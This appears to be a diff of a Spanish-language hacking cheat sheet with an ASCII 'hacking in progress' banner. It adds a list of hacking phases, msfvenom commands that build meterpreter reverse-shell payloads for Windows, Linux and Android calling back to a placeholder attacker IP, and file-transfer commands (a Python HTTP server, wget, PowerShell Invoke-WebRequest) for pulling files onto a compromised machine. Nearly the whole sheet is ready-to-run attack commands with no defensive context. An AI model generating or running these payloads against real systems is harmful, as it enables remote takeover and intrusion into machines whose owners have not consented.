@@ -1,3 +1,5 @@
+¡DISCLAIMER! Esta helpsheet es bajo mi conocimiento, claramente hay otros metodos u otras formas de hacer los comandos en la terminal
+
 H A C K I N G   I N   P R O G R E S S:
 ██ 20% ... 
 ███ 40% .... 
@@ -32,7 +34,17 @@ H A C K I N G   I N   P R O G R E S S:
 
 W E L C O M E   T O   T H E   H A C K:
 
-msfvenom Reverse Shell
+Fases del hacking:
+
+1-Enumeracion
+2-Escaneo
+3-Explotación
+4-Post-explotación
+5-Informe
+
+Basic Commands:
+
+- Reverse Shell msfvenom
 
 # Para Windows
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Nuestra_IP> LPORT=<Port> -f exe -o payload.exe
@@ -42,3 +54,16 @@ msfvenom -p linux/meterpreter/reverse_tcp LHOST=<Nuestra_IP> LPORT=<Port> -o tro
 
 # Para Android 
 msfvenom -p android/meterpreter/reverse_tcp LHOST=<Nuestra_IP> LPORT=<Port> -o payload.apk
+
+- Transferencia de archivos
+
+sudo python3 -m http.server 8080
+sudo python -m SimpleHTTPServer 8080
+
+# Para Linux: 
+
+wget http://[IP]/recurso
+         
+# Para Windows:
+
+powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
